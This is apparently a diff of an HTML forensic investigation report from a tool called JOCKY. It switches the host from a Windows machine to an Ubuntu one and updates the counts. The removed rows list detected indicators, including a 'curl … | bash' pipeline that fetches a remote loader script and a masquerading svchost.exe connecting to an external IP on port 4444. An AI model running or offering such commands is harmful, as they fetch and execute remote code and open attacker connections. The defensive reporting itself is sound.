@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>JOCKY Forensic Investigation Report — HOST-001</title>
+  <title>JOCKY Forensic Investigation Report — HOST-002</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
@@ -194,15 +194,15 @@
     <div class="meta-box">
       <div class="meta-item">
         <span class="meta-label">Host Target</span>
-        <span class="meta-val">HOST-001</span>
+        <span class="meta-val">HOST-002</span>
       </div>
       <div class="meta-item">
         <span class="meta-label">Operating System</span>
-        <span class="meta-val">Windows</span>
+        <span class="meta-val">Ubuntu</span>
       </div>
       <div class="meta-item">
         <span class="meta-label">Scan ID</span>
-        <span class="meta-val">JCK-2026-840</span>
+        <span class="meta-val">JCK-2026-529</span>
       </div>
       <div class="meta-item">
         <span class="meta-label">Timestamp</span>
@@ -210,14 +210,14 @@
       </div>
       <div class="meta-item">
         <span class="meta-label">Total Evidence Items</span>
-        <span class="meta-val">1313</span>
+        <span class="meta-val">1308</span>
       </div>
     </div>
 
     <div class="grid-stats">
       <div class="stat-card">
         <div class="stat-label">System Processes</div>
-        <div class="stat-value" style="color: var(--cyan);">5</div>
+        <div class="stat-value" style="color: var(--cyan);">0</div>
       </div>
       <div class="stat-card">
         <div class="stat-label">Services Inspected</div>
@@ -237,18 +237,18 @@
       </div>
       <div class="stat-card" style="border-color: rgba(244, 63, 94, 0.4);">
         <div class="stat-label" style="color: var(--rose);">Suspicious Indicators</div>
-        <div class="stat-value" style="color: var(--rose);">13</div>
+        <div class="stat-value" style="color: var(--rose);">10</div>
       </div>
     </div>
 
     <div class="grid-stats" style="grid-template-columns: repeat(4, 1fr);">
       <div class="stat-card" style="border-left: 3px solid var(--rose);">
         <div class="stat-label">Critical Severity</div>
-        <div class="stat-value" style="color: var(--rose); font-size: 1.4rem;">6</div>
+        <div class="stat-value" style="color: var(--rose); font-size: 1.4rem;">4</div>
       </div>
       <div class="stat-card" style="border-left: 3px solid var(--amber);">
         <div class="stat-label">High Severity</div>
-        <div class="stat-value" style="color: var(--amber); font-size: 1.4rem;">4</div>
+        <div class="stat-value" style="color: var(--amber); font-size: 1.4rem;">3</div>
       </div>
       <div class="stat-card" style="border-left: 3px solid var(--cyan);">
         <div class="stat-label">Medium Severity</div>
@@ -277,30 +277,6 @@
       </thead>
       <tbody>
         <tr>
-  <td><span style="font-family: monospace; font-size: 0.8rem; color: #94a3b8;">IND-PROC-31337</span></td>
-  <td><span style="background: rgba(244, 63, 94, 0.15); color: #f43f5e; border: 1px solid #f43f5e; font-size: 0.72rem; font-weight: 700; padding: 2px 8px; border-radius: 4px;">CRITICAL</span></td>
-  <td><span style="font-size: 0.75rem; color: #cbd5e1; background: #1e293b; padding: 2px 6px; border-radius: 4px;">PROCESS</span></td>
-  <td style="font-weight: 600; color: #f8fafc;">Suspicious Binary Execution From Temporary Directory (svchost.exe)</td>
-  <td style="color: #94a3b8; font-size: 0.82rem;">Process PID 31337 'svchost.exe' launched from non-standard writable path.</td>
-  <td><code style="font-size: 0.78rem; background: #090d16; padding: 4px 8px; border-radius: 4px; color: #38bdf8; display: block; word-break: break-all;">PID: 31337, Cmdline: C:\Users\Public\svchost.exe --connect 185.220.101.5:4444</code></td>
-  <td><span style="font-family: monospace; font-size: 0.75rem; color: #a78bfa;">T1059.004</span></td>
-</tr><tr>
-  <td><span style="font-family: monospace; font-size: 0.8rem; color: #94a3b8;">IND-MASQ-31337</span></td>
-  <td><span style="background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid #f59e0b; font-size: 0.72rem; font-weight: 700; padding: 2px 8px; border-radius: 4px;">HIGH</span></td>
-  <td><span style="font-size: 0.75rem; color: #cbd5e1; background: #1e293b; padding: 2px 6px; border-radius: 4px;">PROCESS</span></td>
-  <td style="font-weight: 600; color: #f8fafc;">Process Masquerading as Core System Component (svchost.exe)</td>
-  <td style="color: #94a3b8; font-size: 0.82rem;">Rogue process name mimics kernel or Windows service daemon to evade analyst inspection.</td>
-  <td><code style="font-size: 0.78rem; background: #090d16; padding: 4px 8px; border-radius: 4px; color: #38bdf8; display: block; word-break: break-all;">PID: 31337, Name: svchost.exe, Cmdline: C:\Users\Public\svchost.exe --connect 185.220.101.5:4444</code></td>
-  <td><span style="font-family: monospace; font-size: 0.75rem; color: #a78bfa;">T1036.005</span></td>
-</tr><tr>
-  <td><span style="font-family: monospace; font-size: 0.8rem; color: #94a3b8;">IND-SHELL-4120</span></td>
-  <td><span style="background: rgba(244, 63, 94, 0.15); color: #f43f5e; border: 1px solid #f43f5e; font-size: 0.72rem; font-weight: 700; padding: 2px 8px; border-radius: 4px;">CRITICAL</span></td>
-  <td><span style="font-size: 0.75rem; color: #cbd5e1; background: #1e293b; padding: 2px 6px; border-radius: 4px;">PROCESS</span></td>
-  <td style="font-weight: 600; color: #f8fafc;">Remote Shell Dropper Pipeline Detected</td>
-  <td style="color: #94a3b8; font-size: 0.82rem;">Live piped execution of remote unverified script via curl/bash.</td>
-  <td><code style="font-size: 0.78rem; background: #090d16; padding: 4px 8px; border-radius: 4px; color: #38bdf8; display: block; word-break: break-all;">PID: 4120, Cmdline: curl -s http://194.26.29.112/loader.sh | bash</code></td>
-  <td><span style="font-family: monospace; font-size: 0.75rem; color: #a78bfa;">T1059.004</span></td>
-</tr><tr>
   <td><span style="font-family: monospace; font-size: 0.8rem; color: #94a3b8;">IND-SVC-backdoor_svc_service</span></td>
   <td><span style="background: rgba(244, 63, 94, 0.15); color: #f43f5e; border: 1px solid #f43f5e; font-size: 0.72rem; font-weight: 700; padding: 2px 8px; border-radius: 4px;">CRITICAL</span></td>
   <td><span style="font-size: 0.75rem; color: #cbd5e1; background: #1e293b; padding: 2px 6px; border-radius: 4px;">SERVICE</span></td>
@@ -389,7 +365,7 @@
         ✓ Cryptographic Evidence Integrity Seal
       </div>
       <div style="color: var(--text-muted); font-size: 0.78rem; margin-bottom: 4px;">
-        SHA-256 Checksum: <span style="color: #fff;">efbbe5b8f63def04c92a11d9c43ada8d5ca4a1fd6e58c2510b49c83157a7d44a</span>
+        SHA-256 Checksum: <span style="color: #fff;">9b4b1a3d5f7ea1011a3d8398c24ec4e1cc987e0d833d305e39f7012c6987fac6</span>
       </div>
       <div style="color: var(--text-muted); font-size: 0.75rem;">
         Chain of custody anchored into JOCKY tamper-evident audit ledger. Certified admissible under Indian Evidence Act §65B.
